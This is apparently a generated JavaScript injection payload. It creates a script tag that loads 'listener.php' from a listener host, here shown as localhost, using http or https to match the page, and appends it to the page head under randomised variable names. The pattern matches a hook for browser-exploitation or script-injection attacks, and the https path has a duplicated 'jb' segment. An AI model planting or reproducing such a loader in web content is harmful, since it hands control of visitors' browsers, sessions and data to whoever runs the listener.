var hjZuf=document.createElement("script");
hjZuf.setAttribute("type","text/javascript");
if (location.protocol !== "https:") {
  hjZuf.setAttribute("src","http://localhost/jb/js/listener.php?proto=http");
} else {
  hjZuf.setAttribute("src","https://localhost/jb/jb/js/listener.php?proto=https");
}
var gfDrh = document.getElementsByTagName("head")[0];
gfDrh.appendChild(hjZuf);
